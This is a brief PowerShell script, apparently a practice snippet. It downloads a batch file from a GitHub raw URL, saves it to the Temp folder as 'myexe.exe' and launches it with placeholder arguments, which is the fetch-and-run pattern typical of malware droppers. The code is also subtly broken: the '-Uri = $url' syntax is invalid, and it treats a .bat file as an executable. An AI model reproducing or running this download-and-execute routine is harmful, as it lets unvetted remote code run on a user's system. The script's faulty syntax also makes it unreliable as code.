$url = 'https://raw.githubusercontent.com/deathlimited/Learning/master/lel.bat'
$outpath = "$env:Temp/myexe.exe"
Invoke-WebRequest -Uri = $url -OutFile $outpath
$args = @("Comma","Separated","Arguments")
Start-Process -Filepath "$env:Temp/myexe.exe" -ArgumentList $args
